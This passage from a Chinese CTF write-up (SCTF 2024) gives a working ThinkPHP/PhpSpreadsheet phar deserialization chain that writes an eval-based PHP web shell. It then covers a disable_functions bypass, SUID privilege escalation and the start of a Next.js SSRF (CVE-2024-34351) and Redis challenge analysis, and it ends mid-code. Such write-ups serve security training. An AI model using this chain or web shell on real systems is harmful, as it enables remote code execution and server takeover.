<p>这个链子的原型是 Thinkphp v6.0.13反序列化rce漏洞(CVE-2022-38352)，参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/1vxyz/articles/17659770.html">https://www.cnblogs.com/1vxyz/articles/17659770.html</a></p>
<p>入口处选择了 PhpOffice\PhpSpreadsheet\Collection::Cells，同样也是一个用来缓存的类</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20241004010724578.png" alt="image-20241004010724578"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">namespace</span> <span class="token package">PhpOffice<span class="token punctuation">\</span>PhpSpreadsheet<span class="token punctuation">\</span>Collection</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Cells</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">private</span> <span class="token variable">$cache</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cache</span> <span class="token operator">=</span> <span class="token variable">$exp</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>log</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Channel</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$logger</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$lazy</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">logger</span> <span class="token operator">=</span> <span class="token variable">$exp</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lazy</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Request</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$url</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php file_put_contents("/var/www/public/uploads/store/comment/20241004/0w0.php", \'&lt;?php eval($_POST[1]); ?>\', FILE_APPEND); ?>'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">App</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$instances</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">instances</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'think\Request'</span><span class="token operator">=></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>view<span class="token punctuation">\</span>driver</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Php</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>log<span class="token punctuation">\</span>driver</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Socket</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$app</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>

            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
                <span class="token string single-quoted-string">'debug'</span><span class="token operator">=></span><span class="token constant boolean">true</span><span class="token punctuation">,</span>
                <span class="token string single-quoted-string">'force_client_ids'</span> <span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">,</span>
                <span class="token string single-quoted-string">'allow_client_ids'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
                <span class="token string single-quoted-string">'format_head'</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>view<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Php</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'display'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">app</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>log<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Socket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>log<span class="token punctuation">\</span>Channel</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">PhpOffice<span class="token punctuation">\</span>PhpSpreadsheet<span class="token punctuation">\</span>Collection<span class="token punctuation">\</span>Cells</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.readonly"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.jpg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同样的方式gzip打包后上传并phar包含，成功</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20241004002901272.png" alt="image-20241004002901272"></p>
<p>蚁剑连上去，发现开了disable_function</p>
<p>蚁剑插件打fpm跟它爆了即可</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20241004005351773.png" alt="image-20241004005351773"></p>
<p>连接 .antproxy.php 文件，密码不变</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20241004005659565.png" alt="image-20241004005659565"></p>
<p>最后find suid简单提个权即可</p>
<hr>
<h1 id="ezjump（复现）"><a href="#ezjump（复现）" class="headerlink" title="ezjump（复现）"></a>ezjump（复现）</h1><p>稍微审一下代码，是 tsx 前端 + py 后端 + redis的服务</p>
<p>三个服务在同一个c段下</p>
<p>前端 tsx 总共有两个路由：</p>
<ul>
<li>&#x2F;play</li>
<li>&#x2F;success</li>
</ul>
<p>直接看 &#x2F;success 路由的逻辑：</p>
<pre class="line-numbers language-tsx" data-language="tsx"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span>redirect<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"next/navigation"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Success</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">Congratulations! CTFer!</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span>
            <span class="token attr-name">action</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                <span class="token string">"use server"</span><span class="token punctuation">;</span>
                <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/play"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span>
            <span class="token punctuation">></span></span><span class="token plain-text">
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">Let us Play Again!!</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>
    <span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>直接猜测是在依赖上做文章打 ssrf 到内网py服务</p>
<p>搜一下，有CVE-2024-34351，参考：</p>
<p><a target="_blank" rel="noopener" href="https://zone.huoxian.cn/d/2910-nextjs-1411-server-actions-ssrf-cve-2024-34351">https://zone.huoxian.cn/d/2910-nextjs-1411-server-actions-ssrf-cve-2024-34351</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/azu/nextjs-CVE-2024-34351">https://github.com/azu/nextjs-CVE-2024-34351</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/God4n/nextjs-CVE-2024-34351-_exploit">https://github.com/God4n/nextjs-CVE-2024-34351-_exploit</a></p>
<p>看一眼依赖版本：<code>&quot;next&quot;: &quot;14.1.0&quot;</code>，是了</p>
<p>直接vps启动服务开打</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240929220729080.png" alt="image-20240929220729080"></p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240929220708582.png" alt="image-20240929220708582"></p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240929220742430.png" alt="image-20240929220742430"></p>
<p>可以打到内网的python服务，然后审py代码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> subprocess
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request

<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template

<span class="token keyword">from</span> Utils<span class="token punctuation">.</span>utils <span class="token keyword">import</span> <span class="token operator">*</span>

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"Welcome to SCTF 2024! Have a Good Time!"</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>
    password <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>
    user <span class="token operator">=</span>get_user<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
    <span class="token keyword">if</span> user<span class="token punctuation">:</span>
            <span class="token keyword">if</span> password <span class="token operator">==</span> user<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"admin"</span><span class="token punctuation">:</span>
                    cmd<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token keyword">not</span> cmd<span class="token punctuation">:</span>
                        <span class="token keyword">return</span> <span class="token string">"No command provided"</span><span class="token punctuation">,</span> <span class="token number">400</span>
                    <span class="token keyword">if</span> waf<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
                        <span class="token keyword">return</span> <span class="token string">"nonono"</span>
                    <span class="token keyword">try</span><span class="token punctuation">:</span>
                        result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'curl'</span><span class="token punctuation">,</span> cmd<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
                        <span class="token keyword">return</span> result<span class="token punctuation">.</span>stdout
                    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token number">500</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username
                    session<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span> <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span>
                <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> role<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span>
                session<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'noBody'</span>
                <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> role<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
            add_user<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> <span class="token string">'n0B0dy'</span><span class="token punctuation">)</span>
            user <span class="token operator">=</span> get_user<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
            <span class="token keyword">if</span> user<span class="token punctuation">:</span>
                session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username
                session<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'noBody'</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span>
                session<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'noBody'</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> role<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">"Please give me username and password!"</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么首先要做的还是伪造 session 的 role 为 admin</p>
<p>这里的 secret_key 是随机，暂时没法利用</p>
<p>先看下面的 else 分支：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">else</span><span class="token punctuation">:</span>
    add_user<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> <span class="token string">'n0B0dy'</span><span class="token punctuation">)</span>
    user <span class="token operator">=</span> get_user<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
    <span class="token keyword">if</span> user<span class="token punctuation">:</span>
        session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username
        session<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'noBody'</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span>
        session<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'noBody'</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> role<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_user</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    user_info_serialized <span class="token operator">=</span> r<span class="token punctuation">.</span>GET<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'user:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> user_info_serialized<span class="token punctuation">:</span>
        user_info <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>user_info_serialized<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> user_info
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>
    <span class="token keyword">return</span> <span class="token boolean">None</span>

<span class="token keyword">def</span> <span class="token function">add_user</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> role<span class="token punctuation">)</span><span class="token punctuation">:</span>
    user_info <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'password'</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span> <span class="token string">'role'</span><span class="token punctuation">:</span> role<span class="token punctuation">&#125;</span>
    user_info_json <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>user_info<span class="token punctuation">)</span>
    user_info_serialized <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>user_info_json<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>SET<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'user:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> user_info_serialized<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">GET</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    redis_socket <span class="token operator">=</span> connect_redis<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment"># 发送命令</span>
        command <span class="token operator">=</span> pack_command<span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>
        redis_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>command<span class="token punctuation">)</span>

        <span class="token comment"># 接收响应</span>
        response <span class="token operator">=</span> <span class="token string">b''</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            chunk <span class="token operator">=</span> redis_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
            response <span class="token operator">+=</span> chunk
            <span class="token keyword">if</span> response<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">b'\r\n'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        redis_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"$-1\r\n"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>
        <span class="token comment"># 提取真实内容</span>
    result_start_idx <span class="token operator">=</span> response<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">b'\r\n'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span>  <span class="token comment"># 跳过第一行响应</span>
    result_end_idx <span class="token operator">=</span> response<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">b'\r\n'</span><span class="token punctuation">,</span> result_start_idx<span class="token punctuation">)</span>  <span class="token comment"># 找到第二个\r\n</span>
    real_content <span class="token operator">=</span> response<span class="token punctuation">[</span>result_start_idx<span class="token punctuation">:</span>result_end_idx<span class="token punctuation">]</span>
    <span class="token keyword">return</span> real_content

<span class="token keyword">def</span> <span class="token function">SET</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
    redis_socket <span class="token operator">=</span> connect_redis<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment"># 发送命令</span>
        command <span class="token operator">=</span> pack_command<span class="token punctuation">(</span><span class="token string">'SET'</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
        command <span class="token operator">=</span> WAF<span class="token punctuation">(</span>command<span class="token punctuation">)</span>
        redis_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>command<span class="token punctuation">)</span>

        <span class="token comment"># 接收响应</span>
        response <span class="token operator">=</span> <span class="token string">b''</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            chunk <span class="token operator">=</span> redis_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
            response <span class="token operator">+=</span> chunk
